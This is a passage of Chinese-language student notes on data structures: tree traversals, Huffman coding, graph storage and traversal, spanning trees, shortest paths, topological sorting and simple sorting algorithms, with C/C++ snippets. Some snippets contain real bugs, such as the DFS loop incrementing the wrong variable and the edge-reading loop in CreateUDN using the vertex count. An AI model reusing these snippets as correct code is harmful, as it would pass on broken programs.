> ```\n  >\n  > 例子2：\n  >\n  > ```\n  > 先序：ABDGHCEFI，中序：GDHBAECIF，求后序？\n  > 分析：按照先序的定义得到A为最外层根节点，再根据中序结果可知GDHB为A的左子树，ECIF为A的右子树；B先出现在先序结果中可知B为左子树的根节点，再根据中序结果知B节点没有右子树，GDH均为B节点的左子树，再根据先序结果D先出现，知D为B左子树的根节点，再根据先序发现G在D的后面且中序中G在D的前面得出G为D左子树的根节点，那么D的右子树的根节点就是H了，依次类推A的右子树，得出原始二叉树为：      \n  > \t A\n  > \t/ \\\n  > \tB   C\n  >       /   / \\\n  >     D   E   F\n  >   / \\     /\n  > G   H   I\n  > 那么此二叉树的后序为：GHDBEIFCA\n  > ```\n  >\n  > 例子3：\n  >\n  > ```\n  > 中序：BDCEAFHG，后序：DECBHGFA，求先序？\n  > 分析：由后序结果知A为最外层根节点，再根据中序结果知BDCE为A节点的左子树，FHG为A的右子树；A的左子树中B最靠近A那么根据后序规则得出B为左子树的根节点，再根据中序结果B在结果的第一位，由中序规则知B没有左子树，DCE均为B的右子树，在DCE中后序结果C最靠近B，得出C为B的右子树的根节点，再依据中序结果知C前面是D后面是E得出D为C的左子树，E为C的右子树，同理可以推出A的右子树，得出原始二叉树为：        \n  > \t\t     A       \n  > \t\t\t/ \\\n  >                B   F\n  >                 \\   \\\n  >         \t      C   G\n  >                 / \\  /\n  >                D   E H\n  > 那么此二叉树的先序为：ABCDEFGH\n  > ```\n\n**树的应用**\n\n- 树是数据库中数据组织的一种重要形式\n- 操作系统子父进程的关系本身就是一棵树\n- 面向对象语言中类的继承关系本身就是一棵树\n- 赫夫曼树\n\n### 3.1.1 链式二叉树的遍历\n\n```c\n# include <stdio.h>\n# include <malloc.h>\n\nstruct BTNode\n{\n    int data;\n    struct BTNode * pLchild; //p是指针 L是左 child是孩子\n    struct BTNode * pRchild;\n};\n\nvoid PreTraverseBTree(struct BTNode *);\nvoid InTraverseBTree(struct BTNode *);\nvoid PostTraverseBTree(struct BTNode *);\nstruct BTNode * CreateBTree();\n\nint main()\n{\n    struct BTNode * pT = CreateBTree();\n\n    PreTraverseBTree(pT); //先序\n    InTraverseBTree(pT); //中序\n    PostTraverseBTree(pT); //后序\n\n    return 0;\n}\n\nvoid PreTraverseBTree(struct BTNode * pT)\n{\n    if (NULL != pT)\n    {\n        printf(\"%c\\n\", pT->data);\n\n        if (NULL != pT->pLchild)\n        {\n            PreTraverseBTree(pT->pLchild); //pT->pLchild可以代表整个左子树\n        }\n\n        if (NULL != pT->pRchild)\n        {\n            PreTraverseBTree(pT->pRchild);\n        }\n    }\n/*\n    先访问根节点\n    再先序访问左子树\n    再先序访问右子树\n*/\n}\n\nvoid InTraverseBTree(struct BTNode * pT)\n{\n    if (NULL != pT)\n    {\n        if (NULL != pT->pLchild)\n        {\n            InTraverseBTree(pT->pLchild); //pT->pLchild可以代表整个左子树\n        }\n\n        printf(\"%c\\n\", pT->data);\n\n        if (NULL != pT->pRchild)\n        {\n            InTraverseBTree(pT->pRchild);\n        }\n    }\n/*\n    先访问左子树\n    再访问根\n    再访问右子树\n*/\n}\n\nvoid PostTraverseBTree(struct BTNode * pT)\n{\n    if (NULL != pT)\n    {\n        if (NULL != pT->pLchild)\n        {\n            PostTraverseBTree(pT->pLchild); //pT->pLchild可以代表整个左子树\n        }\n\n        if (NULL != pT->pRchild)\n        {\n            PostTraverseBTree(pT->pRchild);\n        }\n\n        printf(\"%c\\n\", pT->data);\n    }\n/*\n    先访问左子树\n    再访问右子树\n    再访问根\n*/\n}\n\nstruct BTNode * CreateBTree()\n{\n    struct BTNode * pA = (struct BTNode *)malloc(sizeof(struct BTNode));\n    struct BTNode * pB = (struct BTNode *)malloc(sizeof(struct BTNode));\n    struct BTNode * pC = (struct BTNode *)malloc(sizeof(struct BTNode));\n    struct BTNode * pD = (struct BTNode *)malloc(sizeof(struct BTNode));\n    struct BTNode * pE = (struct BTNode *)malloc(sizeof(struct BTNode));\n\n    pA->data = 'A';\n    pB->data = 'B';\n    pC->data = 'C';\n    pD->data = 'D';\n    pE->data = 'E';\n\n    pA->pLchild = pB;\n    pA->pRchild = pC;\n    pB->pLchild = pB->pRchild = NULL;\n    pC->pLchild = pD;\n    pC->pRchild = NULL;\n    pD->pLchild = NULL;\n    pD->pRchild = pE;\n    pE->pLchild = pE->pRchild = NULL;\n\n    return pA;\n}\n```\n\n### 3.1.2 哈夫曼树(最优二叉树)\n\n结点数目相同的二叉树中，完全二叉树是路径长度最短的二叉树。\n\n权(weight)：将树中结点赋给一个有着某种含义的数值，则这个数值称为该结点的权。\n\n结点的带权路径长度：从根结点到该结点之间的路径长度与该结点的权的乘积。\n\n树的路径长度：从树根到每一个结点的路径长度之和，记作TL。\n\n树的带权路径长度：树中所有叶子结点的带权路径长度之和，记作WPL。\n\n哈夫曼树就是带权路径长度(WPL)最短的二叉树(最优二叉树)。\n\n在哈夫曼算法中，初始时有n棵二叉树，要经过n-1次合并最终形成哈夫曼树。经过n-1次合并产生n-1个新结点，且这n-1个新结点都是具有两个孩子的分支结点。可见，哈夫曼树中共有n+n-1=2n-1个结点，且其所有的分支结点的度均不为1。\n\n```c++\ntypedef struct\n{\n    int weight;\n    int parent, lch, rch;\n}HTNode, *HuffmanTree;\n\nvoid CreateHuffmanTree(HuffmanTree HT, int n)\n{\n    if(n <= 1)\n        return;\n    m = 2 * n - 1;\t//数组共2n-1个元素\n    HT = new HTNode[m+1];\t//0号单元未用，HT[m]表明根结点\n    for(i=1; i<=m; i++)\n    {//初始化哈夫曼树\n        HT[i].lch = 0;\n        HT[i].rch = 0;\n        HT[i].parent = 0;\n    }\n    for(i=1; i<=n; i++)\n        cin >> HT[i].weight;\t//输入前n个元素的权值\n    \n    //建立哈夫曼树\n    for(i=n+1; i<=m; i++)\n    {\n        Select(HT, i-1, s1, s2);//合并产生n-1个结点，在HT[k](1<=k<=i-1)中选择两个其双亲域为0，且权值最小的结点，并返回它们在HT中的序号s1和s2\n        HT[s1].parent = i;\n        HT[s2].parent = i;\n        HT[i].weight = HT[s1].weight + HT[s2].weight;\n    }\n}\n```\n\n### 3.1.3 哈夫曼树的应用——哈夫曼编码\n\n将编码设计为长度不等的二进制编码，即让待传字符串中出现次数较多的字符采用尽可能短的编码，则转换的二进制字符串便可能减少。\n\n关键：设计长度不等的编码，则必须使任一字符的编码都不是另一个字符的编码的前缀，这种编码称作前缀编码。\n\n方法：\n\n1. 统计字符集中每个字符在电文中出现的平均概率(概率越大，要求编码越短)\n\n2. 利用哈夫曼树的特点：权越大的叶子离根越近，将每个字符的概率值作为权值，构造哈夫曼树。概率越大的结点，路径越短。\n\n3. 在哈夫曼树的每个分支上标上0或1：\n\n   结点的左分支标0，右分支标1\n\n   把从根到每个叶子的路径上的标号连接起来，作为该叶子代表的字符的编码\n\n思考：\n\n1. 为什么哈夫曼编码能够保证是前缀编码？\n\n   因为没有一片树叶是另一片树叶的祖先，所以每个叶结点的编码就不可能是其它叶结点编码的前缀。\n\n2. 为什么哈夫曼编码能够保证字符编码总长最短？\n\n   因为哈夫曼树的带权路径长度最短，故字符编码的总长最短。\n\n```c++\nvoid CreateHuffmanCode(HuffmanTree HT, HuffmanCode &HC, int n)\n{//从叶子到根逆向求每个字符的哈夫曼编码，存储在编码表HC中\n    HC = new char *[n+1];\t\t//分配n个字符编码的头指针矢量\n    cd = new char [n];\t\t\t//分配临时存放编码的动态数组空间\n    cd[n-1] = '\\0';\t\t\t\t//编码结束符\n    for(int i=1; i<=n; i++)\t\t//逐个字符求哈夫曼编码\n    {\n        start = n - 1;\n        c = i;\n        f = HT[i].parent;\n        while(f != 0)\t\t\t//从叶子结点开始向上回溯，直到根结点\n        {\n            --start;\t\t\t//回溯一次start向前指一个位置\n            if(HT[f].lch == c)\n                cd[start] = '0';//结点c是f的左孩子，置0\n            else\n                cd[start] = '1';//右孩子置1\n            c = f;\t\t\t\t//继续向上回溯\n            f = HT[f].parent;\t//求出第i个字符的编码\n        }\n        HC[i] = new char [n-start];\n        strcpy(HC[i], &cd[start]);//将求得的编码从临时空间cd复制到HC的当前行中\n    }\n    delete cd;\n}\n```\n\n## 3.2 图\n\n离散数学的知识，我恨！我不想再记多一门课的笔记了呜呜呜。\n\n### 3.2.1 图的概念\n\n图：G = (V, E)，V是顶点(数据元素)的有穷非空集合，E是边的有穷集合。\n\n无向图：每条边都是无方向的。\n\n有向图：每条边都是有方向的。\n\n完全图：任意两个点都有一条边相连。\n\n顶点的度：与该顶点相关联的边的数目，记为TD(v)\n\n在有向图中，顶点的度等于该顶点的入度与出度之和。顶点v的入度是以v为终点的有向边的条数，记作ID(v)；顶点v的出度是以v为始点的有向边的条数，记作OD(v)。\n\n路径：接续的边构成的顶点序列。\n\n路径长度：路径上边或弧的数目/权值之和。\n\n回路(环)：第一个顶点和最后一个顶点相同的路径。\n\n简单路径：除路径起点和终点可以相同外，其余顶点均不相同的路径。\n\n简单回路(简单环)：除路径起点和终点相同外，其余顶点均不相同的路径。\n\n连通图(强连通图)：在无(有)向图G=(V,{E})中，若对任何两个顶点v、u都存在从v到u的路径，则称G是连通图(强连通图)。\n\n权：图中边或弧所具有的相关数称为权。表明从一个顶点到另一个顶点的距离或耗费。\n\n网：带权的图。\n\n### 3.2.2 图的存储结构\n\n图的逻辑结构：多对多。\n\n图没有顺序存储结构，但可以借助二维数组来表示元素间的关系。数组表示法：邻接矩阵。\n\n多重链表：邻接表、邻接多重表、十字链表。\n\n#### 3.2.2.1 邻接矩阵\n\n建立一个顶点表(记录各个顶点信息)和一个邻接矩阵(表示各个顶点之间关系)。设图A=(V,E)有n个顶点，则\n\n| i       | 0    | 1    | 2    | ...  | n-1  |\n| ------- | ---- | ---- | ---- | ---- | ---- |\n| Vexs[i] | V1   | V2   | V3   | ...  | Vn   |\n\n图的邻接矩阵是一个二维数组A.arcs\\[n\\]\\[n\\]，定义为：\n$$\nA.arcs[i][j]=\\begin{cases}1，如果<i,j>\\in E或者(i,j)\\in E\\\\\\\\\n0，否则\\end{cases}\n$$\n无向图的邻接矩阵是对称的。顶点i的度=第i行(列)中1的个数。完全图的邻接矩阵中，对角元素为0，其余为1。\n\n在有向图的邻接矩阵中，第i行表示以结点$V_i$为尾的弧(即出度边)，第i列表示以结点$V_i$为头的弧(即入度边)。\n\n有向图的邻接矩阵可能是不对称的。顶点的出度=第i行元素之和，顶点的入度=第i列元素之和，顶点的度=第i行元素之和+第i列元素之和。\n\n网(即有权图)的邻接矩阵表示法：\n$$\nA.arcs[i][j]=\\begin{cases}W_{ij}，<v_i,v_j>或(v_i,v_j)\\in VR\\\\\\\\\n\\infty，无边(弧)\\end{cases}\n$$\n\n```c\n//邻接矩阵的存储表示：用两个数组分别存储顶点表和邻接矩阵\n#define MaxInt 32767\t//表示无穷\n#define MVNum 100\t\t//定义最大顶点数\ntypedef char VerTexType;//设顶点的数据类型为字符型\ntypedef int ArcType;\t//边的权值\ntypedef struct\n{\n    VerTexType vexs[MVNum];\t//顶点表\n    ArcType arcs[MVNum][MVNum];//邻接矩阵\n    int vexnum,arcnum;\t\t//图的当前点和边数\n}AMGraph;\n```\n\n算法思想：\n\n1. 输入总顶点数和总边数\n2. 依次输入点的信息存入顶点表中\n3. 初始化邻接矩阵，使每个权值初始化为极大值\n4. 构造邻接矩阵\n\n```c++\nStatus CreateUDN(AMGraph &G)\n{//采用邻接矩阵表示法，创建无向网G\n    cin >> G.vexnum >> G.arcnum;//输入总顶点数和总边数\n    for(int i=0; i<G.vexnum; i++)\n        cin >> G.vexs[i];\t\t//依次输入点的信息\n    for(i=0; i<G.vexnum; i++)\n        for(int j=0; j<G.vexnum; j++)\n            G.arcs[i][j] = MaxInt;\t//初始化邻接矩阵\n    for(int k=0; k<G.vexnum; k++)\n    {//构造邻接矩阵\n        cin >> v1 >> v2 >> w;\t//输入一条边所依附的顶点及边的权值\n        i = LocateVex(G, v1);\n        j = LocateVex(G, v2);\t//确定v1和v2在G中的位置\n        G.arcs[i][j] = w;\t\t//边<v1,v2>的权值置位w\n        G.arcs[j][i] = G.arcs[i][j];//无向图，所以是对称的\n    }\n    return OK;\n}\n\nint LocateVex(AMGraph G, VertexType u)\n{//图G中查找顶点u，存在则返回顶点表中的下标；否则返回-1\n    int i;\n    for(i=0; i<G.vexnum; i++)\n        if(u == G.vexs[i])\n            return i;\n    return -1;\n}\n```\n\n邻接矩阵存储图的优点：\n\n- 直观、简单、好理解\n\n- 方便检查一堆顶点间是否存在边\n\n- 方便找任一顶点的所有“邻接点”(有边直接相连的顶点)\n\n- 方便计算任一顶点的“度”(从该点发出的边为“出度”，指向该点的边为“入度”)\n\n  无向图：对应行(或列)非0元素的个数\n\n  有向图：对应行非0元素的个数为“出度”，对应列非0元素的个数为“入度”\n\n缺点：\n\n- 不便于增加和删除顶点\n- 浪费空间——存稀疏图(点很多而边很少)有大量无效元素($O(n^2)$)\n- 浪费时间——统计稀疏图中一共有多少条边($O(n^2)$)\n\n#### 3.2.2.2 邻接表\n\n顶点：按编号顺序将顶点数据存储在一维数组中。\n\n关联同一顶点的边(以顶点为尾的弧)：用线性链表存储。\n\n无向图邻接表的特点：\n\n- 邻接表不唯一\n- 若无向图中有n个顶点、e条边，则其邻接表需n个头结点和2e个表结点。适宜存储稀疏图。空间复杂度O(n+2e)\n- 无向图中顶点$v_i$的度为第i个单链表中的结点数\n\n有向图的邻接表的特点：\n\n- 顶点$v_i$的出度为第i个单链表中的结点个数\n- 顶点$v_i$的入度为整个单链表中邻接点域值是i-1的结点个数\n- 由于找出度容易，找入度难，所以可以弄一个逆邻接表存储入度边\n\n```c\n#define MVNum 100\t\t//定义最大顶点数\ntypedef char VerTexType;\ntypedef struct ArcNode\t//边结点\n{\n    int adjvex;\t\t\t\t\t//该边所指向的顶点的位置\n    struct ArcNode * nextarc;\t//指向下一条边的指针\n    OtherInfo info;\t\t\t\t//和边相关的信息，权值等\n}ArcNode;\n\ntypedef struct VNode\n{\n    VerTexType data;\t\t//顶点信息\n    ArcNode *firstarc;\t\t//指向第一条依附该顶点的边的指针\n}VNode, AdjList[MVNum];\t\t//AdjList表示邻接表类型\n\ntypedef struct\n{\n    AdjList vertices;\n    int vexnum, arcnum;\t\t//图的当前顶点数和弧数\n}ALGraph;\n```\n\n算法思想：\n\n1. 输入总顶点数和总边数\n\n2. 建立顶点表\n\n   依次输入点的信息存入顶点表中\n\n   使每个表头结点的指针域初始化为NULL\n\n3. 创建邻接表\n\n   依次输入每条边依附的两个顶点\n\n   确定两个顶点的序号i和j，建立边结点\n\n   将此边结点分别插到$v_i$和$v_j$对应的两个比链表的头部\n\n```c++\nStatus CreateUDG(ALGraph &G)\n{//采用邻接表创建无向图G\n    cin >> G.vexnum >> G.arcnum;//输入总顶点数和总边数\n    for(int i=0; i<G.vexnum; i++)\n    {\n        cin >> G.vertices[i].data;//输入顶点值\n        G.vertices[i].firstarc = NULL;//初始化表头结点的指针域\n    }\n    for(int k=0; k<G.arcnum; k++)//输入各边，构造邻接表\n    {\n        cin >> v1 >> v2;\t\t//输入一条边依附的两个顶点\n        i = LocateVex(G, v1);\n        j = LOcateVex(G, v2);\n        \n        p1 = new ArcNode;\t\t\t//生成一个新的边结点p1\n        p1->adjvex = j;\t\t\t\t//邻接点序号为j\n        p1->nextarc = G.vertices[i].firstarc;//头插法\n        G.vertices[i].firstarc = p1;//将新结点p1插入顶点vi的边表头部\n\n        p2 = new ArcNode;\n        p2->adjvex = i;\n        p2->nextarc = G.vertices[j].firstarc;\n        G.vertices[j].firstarc = p2;//将新结点p1插入顶点vi的边表头部\n    }\n    return OK;\n}\n```\n\n#### 3.2.2.3 邻接矩阵和邻接表的关系\n\n联系：邻接表中每个链表对应于邻接矩阵中的一行，链表中结点个数等于一行中非零元素的个数。\n\n区别：①对于任一确定的无向图，邻接矩阵是唯一的(行列号与顶点编号一致)，但邻接表不唯一(链接次序与顶点编号无关)；②邻接矩阵的空间复杂度为$O(n^2)$，而邻接表的空间复杂度为$O(n+e)$。\n\n用途：邻接矩阵多用于稠密图，邻接表多用于稀疏图。\n\n#### 3.2.2.4 十字链表\n\n有向图的邻接表有个缺点就是求出度或入度难，所以引入了十字链表。\n\n十字链表是有向图的另一种链式存储结构，可以看成是将有向图的邻接表和逆邻接表结合起来形成的一种链表。\n\n有向图中的每一条弧对应十字链表中的一个弧结点，同时有向图中的每个顶点在十字链表中对应一个结点，叫做顶点结点。\n\n#### 3.2.2.5 邻接多重表\n\n邻接多重表解决无向图每条边都要存储两遍的缺点。\n\n### 3.2.3 图的遍历\n\n遍历定义：从已给的连通图种某一顶点出发，沿着一些边访遍图中所有的顶点，且使每个顶点仅被访问一次，就叫做图的遍历，它是图的基本运算。\n\n遍历实质：找每个顶点的邻接点的过程。\n\n图的特点：图中可能存在回路，且图的任一顶点都可能与其它顶点相通，在访问完某个顶点之后可能会沿着某些边又回到了曾经访问过的顶点。\n\n怎么避免重复访问？\n\n解决思路：设置辅助数组visited[n]，用来标记每个被访问过的顶点。初始状态visited[i]为0，顶点i被访问，改visited[i]为1，防止被多次访问。\n\n#### 3.2.3.1 深度优先搜索(DFS)\n\n一条路走到黑，不撞南墙不回头。\n\n{% asset_img 3.2.3.1.png 深度优先搜索的方法 %}\n\n```c++\nvoid DFS(AMGraph G, int V)\n{//采用邻接矩阵实现图的深度优先遍历\n    cout << v;\t\t\t\t//访问第v个结点\n    visited[v] = true;\n    for (w=0; w<G.vexnum; v++)//依次检查邻接矩阵v所在的行\n        if((G.arcs[v][w]!=0) && (!visited[w]))\n            DFS(G,w);\n    //w是v的邻接点，如果w未访问，则递归调用DFS\n}\n```\n\n用邻接矩阵来表示图，遍历图中每一个顶点都要从头扫描该顶点所在行，时间复杂度为$O(n^2)$。\n\n用邻接表来表示图，虽然有2e个表结点，但只需扫描e个结点即可完成遍历，加上访问n个头结点的时间，时间复杂度为$O(n+e)$。\n\n稠密图适于在邻接矩阵上进行深度遍历；稀疏图适于在邻接表上进行深度遍历。\n\n#### 3.2.3.2 广度优先搜索(BFS)\n\n方法：从图的某一结点出发，首先依次访问该结点的所有邻接顶点$vi_1,vi_2,...,vi_n$，再按这些顶点被访问的先后次序依次访问与它们相邻接的所有未被访问的顶点，重复此过程，直至所有顶点均被访问为止。\n\n```c++\nvoid BFS(Graph G, int v)\n{//采用邻接表实现图的广度优先遍历\n    cout << v;\n    visited[v] = true;\n    InitQueue(Q);\t\t//初始化辅助循环队列，置空\n    EnQueue(Q, v);\t\t//v进队\n    while(!QueueEmpty(Q))\n    {\n        DeQueue(Q, u);\t//队列非空队头元素并置u\n        for(w=FirstAdjVex(G,u); w>=0; w=NextAdjVex(G,u,w))\n            if(!visited[w])\n            {//w为u的尚未访问的邻接顶点\n                cout << w;\n                visited[w] = true;//w进队\n                EnQueue(Q,w);\n            }\n    }\n}\n```\n\n如果使用邻接矩阵，则BFS遍历图中每一个顶点都要从头扫描该顶点所在行，时间复杂度为$O(n^2)$。\n\n用邻接表来表示图，虽然有2e个表结点，但只需扫描e个结点即可完成遍历，加上访问n个头结点的时间，时间复杂度为$O(n+e)$。\n\n#### 3.2.3.3 DFS和BFS的比较\n\n- 空间复杂度相同，都是O(n)(借用了堆栈或队列)\n- 时间复杂度只与存储结构(邻接矩阵或邻接表)有关，而与搜索算法无关\n\n### 3.2.4 图的应用\n\n#### 3.2.4.1 最小生成树\n\n生成树：所有顶点均由边连接在一起，但不存在回路的图。\n\n一个图可以有许多棵不同的生成树。\n\n所有生成树具有以下共同特点：\n\n- 生成树的顶点个数与图的顶点个数相同\n- 生成树是图的极小连通子图，去掉一条边则非连通\n- 一个有n个顶点的连通图的生成树有n-1条边\n- 在生成树中再加一条边必然形成回路\n- 生成树中任意两个顶点间的路径是唯一的\n\n含n个顶点n-1条边的图不一定是生成树。\n\n最小生成树：给定一个无向网络，在该网的所有生成树中，使得各边权值之和最小的那棵生成树称为该网的最小生成树，也叫最小代价生成树。最小生成树可能不唯一。\n\nMST性质(Minimum Spanning Tree)：设N=(V,E)是一个连通网，U是顶点集V的一个非空子集。若边(u,v)是一条具有最小权值的边，其中$u\\in U,v\\in V-U$，则必存在一棵包含边(u,v)的最小生成树。\n\n##### 3.2.4.1.1 普利姆(Prim)算法\n\n算法思想：设N=(V,E)是连通网，TE是N上最小生成树中边的集合。初始令$U=\\{u_0\\},(u_0\\in V),TE=\\{\\}$。在所有$u\\in U,v\\in V-U$的边$(u,v)\\in E$中，找一条代价最小的边$(u_0,v_0)$。将$(u_0,v_0)$并入集合TE，同时$v_0$并入U。重复上述操作直至U=V为止，则T=(V,TE)为N的最小生成树。\n\n##### 3.2.4.1.2 克鲁斯卡尔(Kruskal)算法\n\n算法思想：设连通网N=(V,E)，令最小生成树初始状态为只有n个顶点而无边的非连通图T=(V,{})，每个顶点自成一个连通分量。在E中选取代价最小的边，若该边依附的顶点落在T中不同的连通分量上(即：不能形成环)，则将此边加入到T中；否则，舍去此边，选取下一条代价最小的边。以此类推，直至T中所有顶点都在同一连通分量上为止。\n\n##### 3.2.4.1.3 两种算法的比较\n\n| 算法名     | 普利姆算法          | 克鲁斯卡尔算法        |\n| ---------- | ------------------- | --------------------- |\n| 算法思想   | 选择点              | 选择边                |\n| 时间复杂度 | $O(n^2)$(n为顶点数) | $O(e\\log e)$(e为边数) |\n| 适用范围   | 稠密图              | 稀疏图                |\n\n#### 3.2.4.2 最短路径\n\n在有向图中A点(源点)到达B点(终点)的多条路径中，寻找一条各边权值之和最小的路径，即最短路径。最短路径与最小生成树不同，路径上不一定包含n个顶点，也不一定包含n-1条边。\n\n两种常见的最短路径问题：\n\n- 单源最短路径——用迪杰斯特拉(Dijkstra)算法\n- 所有顶点间的最短路径——用弗洛伊德(Floyd)算法\n\n##### 3.2.4.2.1 Dijkstra算法\n\n算法思想：\n\n1. 初始化：先找出从源点$v_0$到各终点$v_k$的直达路径$(v_0,v_k)$，即通过一条弧到达的路径\n\n2. 选择：从这些路径中找出一条长度最短的路径$(v_0,u)$\n\n3. 更新：然后对其余各条路径进行适当调整\n\n   若在图中存在弧$(u,v_k)$，且$(v_0,u)+(u,v_k)<(v_0,v_k)$，则以路径$(v_0,u,v_k)$代替$(v_0,v_k)$\n\n   在调整后的各条路径中，再找长度最短的路径，以此类推\n\n时间复杂度为$O(n^2)$。\n\n##### 3.2.4.2.2 Floyd算法\n\n求所有顶点间的最短路径：\n\n方法一：每次以一个顶点为源点，重复执行Dijkstra算法n次。时间复杂度为$O(n^3)$。\n\n方法二：Floyd算法，时间复杂度也是$O(n^3)$。\n\n算法思想：\n\n1. 逐个顶点试探\n2. 从$v_i$到$v_j$的所有可能存在的路径中选出一条长度最短的路径\n\n#### 3.2.4.3 有向无环图及其应用\n\n有向无环图：无环的有向图，简称DAG图。\n\n有向无环图常用来描述一个工程或系统的进行过程。一个工程可以分为若干个子工程，只要完成了这些子工程(活动)就可以导致整个工程的完成。\n\nAOV网：用一个有向图表示一个工程的各子工程及其相互制约的关系，其中以顶点表示活动，弧表示活动之间的优先制约关系，称这种有向图为顶点表示活动的网，简称AOV网。AOV网应用于拓扑排序。\n\nAOE网：用一个有向图表示一个工程的各子工程及其相互制约的关系，其中以弧表示活动，顶点表示活动的开始或结束事件，称这种有向图为边表示活动的网，简称AOE网。AOE网应用于关键路径问题。\n\n##### 3.2.4.3.1 拓扑排序\n\nAOV网的特点：\n\n- 若从i到j有一条有向路径，则i是j的前驱；j是i的后继\n- 若<i,j>是网中有向边，则i是j的直接前驱；j是i的直接后继\n- AOV网中不允许有回路，因为如果有回路存在，则表明某项活动以自己为先决条件，显然这是荒谬的\n\n问题：如何判断AOV网中是否有回路？\n\n在AOV网没有回路的前提下，我们将全部活动排列成一个线性序列，使得若AOV网中有弧<i,j>存在，则在这个序列中，i一定排在j的前面，具有这种性质的线性序列称为拓扑有序序列，相应的拓扑有序排序的算法称为拓扑排序。\n\n拓扑排序的方法：\n\n- 在有向图中选一个没有前驱的顶点且输出之\n- 从图中删除该顶点和所有以它为尾的弧\n- 重复上述两步，直至全部顶点均已输出；或者当图中不存在无前驱的顶点为止\n\n一个AOV网的拓扑序列不是唯一的。\n\n拓扑排序的一个重要应用：检测AOV网中是否存在环的方法：对有向图构造其顶点的拓扑有序序列，若网中所有顶点都在它的拓扑有序序列中，则该AOV网必定不存在环。\n\n##### 3.2.4.3.2 关键路径\n\n把工程计划表示为边表示活动的网络，即AOE网，用顶点表示事件，弧表示活动，弧的权表示活动持续时间。事件表示在它之前的活动已经完成，在它之后的活动可以开始。\n\n设一个工程有11项活动，9个事件。\n\n事件v1——表示整个工程开始(源点：入度为0的顶点)\n\n事件v9——表示整个工程结束(汇点：出度为0的顶点)\n\n{% asset_img 3.2.4.3.2.png 关键路径例题 %}\n\n对于AOE网，我们关心两个问题：\n\n1. 完成整项工程至少需要多长时间？\n2. 哪些活动是影响工程进度的关键？\n\n本质上是求解关键路径的问题。如何确定关键路径，需要定义4个描述量：\n\n- $ve(v_j)$——表示事件$v_j$的最早发生时间\n- $vl(v_j)$——表示事件$v_j$的最迟发生时间\n- e(i)——表示活动ai的最早开始时间\n- l(i)——表示活动ai的最迟开始时间\n\nl(i)-e(i)——表示完成活动ai的时间余量\n\n关键活动——关键路径上的活动，即l(i)==e(i)的活动\n\n如何找l(i)==e(i)的关键活动？\n\n- 设活动ai用弧<j,k>表示，其持续时间记为：$w_{j,k}$，则有：$e(i)=ve(j)，l(i)=vl(k)-w_{j,k}$\n\n如何求ve(j)和vl(j)？\n\n- 从ve(1)=0开始向前递推\n  $$\n  ve(j)=\\max_{i}\\{ve(i)+w_{i,j}\\},<i,j>\\in T,2\\le j\\le n\n  $$\n  其中T是所有以j为头的弧的集合\n\n- 从vl(n) = ve(n)开始向后递推\n  $$\n  vl(i)=\\min_{j}\\{vl(j)-w_{i,j} \\},<i,j>\\in S, 1\\le i\\le n-1\n  $$\n  其中S是所有以i为尾的弧的集合\n\n{% asset_img 3.2.4.3.png 关键路径例题 %}\n\n# 4. 查找和排序\n\n排序和查找的关系：排序是查找的前提，排序是重点。\n\n## 4.1 冒泡排序\n\n冒泡排序的基本思想：重复走访过要排序的元素列，依次比较两个相邻的元素，如果顺序错误就把它们交换过来。走访元素的工作是重复地进行直到没有相邻元素需要交换，也就是说该元素列已经排序完成。\n\n```c\n#include <stdio.h>\n \n#define ARR_LEN 255 /*数组长度上限*/\n#define elemType int /*元素类型*/\n \n/* 冒泡排序 */\n/* 1. 从当前元素起，向后依次比较每一对相邻元素，若逆序则交换 */\n/* 2. 对所有元素均重复以上步骤，直至最后一个元素 */\n/* elemType arr[]: 排序目标数组; int len: 元素个数 */\nvoid bubbleSort (elemType arr[], int len) {\n    elemType temp;\n    int i, j;\n    for (i=0; i<len-1; i++) /* 外循环为排序趟数，len个数进行len-1趟 */\n        for (j=0; j<len-1-i; j++) { /* 内循环为每趟比较的次数，第i趟比较len-i次 */\n            if (arr[j] > arr[j+1]) { /* 相邻元素比较，若逆序则交换（升序为左大于右，降序反之） */\n                temp = arr[j];\n                arr[j] = arr[j+1];\n                arr[j+1] = temp;\n            }\n        }\n}\n \nint main (void) {\n    elemType arr[ARR_LEN] = {3,5,1,-7,4,9,-6,8,10,4};\n    int len = 10;\n    int i;\n     \n    bubbleSort (arr, len);\n    for (i=0; i<len; i++)\n        printf (\"%d\\t\", arr[i]);\n    putchar ('\\n');\n     \n    return 0;\n}\n```\n\n## 4.2 选择排序\n\n选择排序的基本思想：第一次从待排序的数据元素中选出最小（或最大）的一个元素，存放在序列的起始位置，然后再从剩余的未排序元素中寻找到最小（大）元素，然后放到已排序的序列的末尾。以此类推，直到全部待排序的数据元素的个数为零。选择排序是不稳定的排序方法。\n\n```c\n#include <stdio.h>\n\nvoid choseSort(int arr[], int n) {\n    int i, j;\n    int min, temp;\n    // 每次从未排序的部分选出一个最小的元素，最后一次只剩一个元素未排序\n    // 此时实际上已经排好序，故只需要n-1次外层大循环\n    for (i = 0; i < n - 1; ++i) {\n        min = i;    // 假定未排序部分的第一个元素为最小的元素\n        // 遍历剩下的部分，找到最小的元素\n        for (j = i + 1; j < n; ++j) {\n            if (arr[j] < arr[min]) {\n                min = j;\n            }\n        }\n        // 如果第一个元素就是最小的元素，就不需要交换了\n        if (min != i) {\n            temp = arr[i];\n            arr[i] = arr[min];\n            arr[min] = temp;\n        }\n    }\n}\n\nint main() {\n    int i = 0;\n    int arr[10] = {5, 2, 3, 8, 1, 2, 6, 9, 3, 7};\n    choseSort(arr, 10);\n    for (i = 0; i < 10; ++i) {\n        printf(\"%d \", arr[i]);\n    }\n    return 0;\n}\n```\n\n## 4.3 插入排序\n\n插入排序的基本思想：将第一个待排序元素看做是一个有序序列，用下一个未排序元素，从后往前比较，然后放入到相应的位置，每比较一次有序序列就增加一个元素，这样就能把每个未排序的元素插入到相应的位置，将序列变得有序。\n\n{% asset_img 插入排序图解.png 插入排序 %}\n\n```c\n#include <stdio.h> \n#include <stdlib.h> \n\n//插入排序 \nvoid InsertSort(int* a, int len);\n\n//输出数组中的元素 \nvoid OutputArray(int* a, int len);\n\nvoid main()\n{\n    int a[7] = { 2, 9, 5, 4, 8, 1, 6 };\n\n    //输出数组中的元素 \n    printf(\"排序前的数据:\");\n    OutputArray(a, 7);\n\n    //插入排序 \n    InsertSort(a, 7);\n\n    //输出排序后的结果 \n    printf(\"排序后的数据:\");\n    OutputArray(a, 7);\n\n    system(\"pause\");\n}\n\n//插入排序 \nvoid InsertSort(int *a, int len)\n{\n    int i, j;\n    int temp;\n    for (i = 1; i < len; i++)\n    {\n        temp = a[i];\n        for (j = i; j > 0 && a[j - 1] > temp; j--)\n        {\n            a[j] = a[j - 1];\n        }\n        